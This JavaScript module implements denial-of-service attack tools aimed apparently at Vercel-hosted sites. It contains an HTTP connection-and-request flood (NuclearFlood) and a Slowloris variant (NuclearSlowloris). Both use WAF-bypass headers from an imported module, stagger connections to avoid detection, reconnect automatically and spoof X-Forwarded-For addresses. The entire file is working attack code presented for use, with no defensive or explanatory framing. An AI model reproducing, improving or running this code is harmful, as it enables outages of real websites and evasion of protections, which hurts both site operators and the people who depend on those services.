// HTTP Flood that WILL exhaust Vercel's limits
const net = require('net');
const http = require('http');
const https = require('https');
const URL = require('url');
const { NuclearBypass } = require('./waf');

class NuclearFlood {
  constructor() {
    this.connections = new Set();
    this.requests = 0;
    this.active = false;
  }
  
  async executeNuclearFlood(target, options = {}) {
    console.log('☢️ LAUNCHING NUCLEAR FLOOD');
    
    this.active = true;
    this.target = target;
    
    const url = new URL.URL(target);
    const isHTTPS = url.protocol === 'https:';
    const port = url.port || (isHTTPS ? 443 : 80);
    const hostname = url.hostname;
    const path = url.pathname + url.search;
    
    const connections = options.connections || 1000;
    const duration = options.duration || 30000;
    
    // Start connection flood
    for (let i = 0; i < connections && this.active; i++) {
      this.createNuclearConnection(hostname, port, isHTTPS, path, i);
      
      // Stagger to avoid immediate detection
      if (i % 50 === 0) {
        await this.sleep(100);
      }
    }
    
    // Also start request flood
    this.startRequestFlood(target, options.rate || 100);
    
    // Run for duration
    return new Promise((resolve) => {
      setTimeout(() => {
        this.stop();
        resolve({
          connections: this.connections.size,
          requests: this.requests,
          status: 'NUCLEAR_FLOOD_COMPLETE',
          ban_imminent: true
        });
      }, duration);
    });
  }
  
  createNuclearConnection(hostname, port, isHTTPS, path, id) {
    try {
      const socket = isHTTPS
        ? require('tls').connect(port, hostname, {
            rejectUnauthorized: false,
            secureContext: require('crypto').createSecureContext({
              ciphers: 'ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-CHACHA20-POLY1305'
            })
          })
        : net.createConnection(port, hostname);
      
      this.connections.add(socket);
      
      // Generate attack headers
      const bypass = new NuclearBypass();
      const headers = bypass.generateNuclearHeaders(`http${isHTTPS ? 's' : ''}://${hostname}`);
      
      // Build malicious request
      const requestLines = [
        `GET ${path} HTTP/1.1`,
        `Host: ${hostname}`,
        ...Object.entries(headers).map(([k, v]) => `${k}: ${v}`),
        'Connection: keep-alive',
        'Accept-Encoding: gzip, deflate, br, zstd',
        '\r\n'
      ];
      
      const fullRequest = requestLines.join('\r\n');
      
      socket.on('connect', () => {
        // Send initial request
        socket.write(fullRequest);
        
        // Send more requests on same connection (pipelining)
        const sendMore = () => {
          if (!this.active || !socket.writable) {
            socket.destroy();
            return;
          }
          
          // Modified request each time
          const modifiedRequest = fullRequest.replace(
            'X-Request-ID:',
            `X-Request-ID: ${require('crypto').randomUUID()}`
          );
          
          socket.write(modifiedRequest);
          this.requests++;
          
          // Continue flooding
          if (this.active) {
            setTimeout(sendMore, 10);
          }
        };
        
        // Start flood
        sendMore();
      });
      
      socket.on('data', (data) => {
        // Ignore response, just keep attacking
        if (socket.writable && this.active) {
          socket.write(fullRequest);
          this.requests++;
        }
      });
      
      socket.on('error', (err) => {
        // Silently handle - create new connection
        this.connections.delete(socket);
        setTimeout(() => {
          if (this.active) {
            this.createNuclearConnection(hostname, port, isHTTPS, path, id);
          }
        }, 100);
      });
      
      socket.on('timeout', () => {
        socket.destroy();
        this.connections.delete(socket);
      });
      
      socket.on('close', () => {
        this.connections.delete(socket);
        // Auto-reconnect
        if (this.active) {
          setTimeout(() => {
            this.createNuclearConnection(hostname, port, isHTTPS, path, id);
          }, 500);
        }
      });
      
    } catch (err) {
      // Connection failed, try again
      if (this.active) {
        setTimeout(() => {
          this.createNuclearConnection(hostname, port, isHTTPS, path, id);
        }, 1000);
      }
    }
  }
  
  startRequestFlood(target, rate) {
    const floodInterval = setInterval(() => {
      if (!this.active) {
        clearInterval(floodInterval);
        return;
      }
      
      for (let i = 0; i < rate; i++) {
        this.sendRapidRequest(target);
      }
    }, 1000);
  }
  
  sendRapidRequest(target) {
    const protocol = target.startsWith('https') ? https : http;
    
    const bypass = new NuclearBypass();
    const headers = bypass.generateNuclearHeaders(target);
    
    const req = protocol.request(target, {
      method: 'GET',
      headers: headers,
      timeout: 5000,
      agent: false // No connection pooling
    }, (res) => {
      res.on('data', () => {});
      res.on('end', () => {
        this.requests++;
      });
    });
    
    req.on('error', () => {
      // Ignore errors
    });
    
    req.setTimeout(3000, () => {
      req.destroy();
    });
    
    req.end();
  }
  
  stop() {
    this.active = false;
    this.connections.forEach(socket => {
      try {
        socket.destroy();
      } catch (err) {}
    });
    this.connections.clear();
  }
  
  sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

// Slowloris variation
class NuclearSlowloris {
  constructor() {
    this.sockets = new Set();
    this.active = false;
  }
  
  async attack(target, options = {}) {
    console.log('☢️ LAUNCHING NUCLEAR SLOWLORIS');
    
    this.active = true;
    const url = new URL.URL(target);
    const isHTTPS = url.protocol === 'https:';
    const port = url.port || (isHTTPS ? 443 : 80);
    const hostname = url.hostname;
    
    const sockets = options.sockets || 1000;
    
    // Create incomplete connections
    for (let i = 0; i < sockets && this.active; i++) {
      this.createIncompleteSocket(hostname, port, isHTTPS, i);
      
      if (i % 100 === 0) {
        await this.sleep(100);
      }
    }
    
    return { status: 'SLOWLORIS_ACTIVE', sockets: this.sockets.size };
  }
  
  createIncompleteSocket(hostname, port, isHTTPS, id) {
    try {
      const socket = isHTTPS
        ? require('tls').connect(port, hostname, { rejectUnauthorized: false })
        : net.createConnection(port, hostname);
      
      this.sockets.add(socket);
      
      // Send partial headers
      const partialRequest = 
        `GET /${require('crypto').randomBytes(8).toString('hex')} HTTP/1.1\r\n` +
        `Host: ${hostname}\r\n` +
        `User-Agent: ${this.randomUserAgent()}\r\n` +
        `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n` +
        `Accept-Language: en-US,en;q=0.5\r\n` +
        `Accept-Encoding: gzip, deflate\r\n` +
        `Connection: keep-alive\r\n` +
        `X-Forwarded-For: ${this.randomIP()}\r\n`;
      
      socket.write(partialRequest);
      
      // Keep connection alive with random headers
      const keepAlive = setInterval(() => {
        if (!socket.writable || !this.active) {
          clearInterval(keepAlive);
          return;
        }
        
        const randomHeader = 
          `X-${require('crypto').randomBytes(4).toString('hex')}: ` +
          `${require('crypto').randomBytes(8).toString('hex')}\r\n`;
        
        socket.write(randomHeader);
      }, 15000);
      
      socket.on('error', () => {
        clearInterval(keepAlive);
        this.sockets.delete(socket);
        // Recreate if still active
        if (this.active) {
          setTimeout(() => {
            this.createIncompleteSocket(hostname, port, isHTTPS, id);
          }, 5000);
        }
      });
      
      socket.on('timeout', () => {
        socket.destroy();
        clearInterval(keepAlive);
        this.sockets.delete(socket);
      });
      
      socket.on('close', () => {
        clearInterval(keepAlive);
        this.sockets.delete(socket);
      });
      
    } catch (err) {
      // Connection failed
    }
  }
  
  randomUserAgent() {
    const agents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
      'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15'
    ];
    return agents[Math.floor(Math.random() * agents.length)];
  }
  
  randomIP() {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
  }
  
  stop() {
    this.active = false;
    this.sockets.forEach(socket => socket.destroy());
    this.sockets.clear();
  }
  
  sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

module.exports = {
  NuclearFlood,
  NuclearSlowloris,
  executeNuclearAttack: new NuclearFlood()
};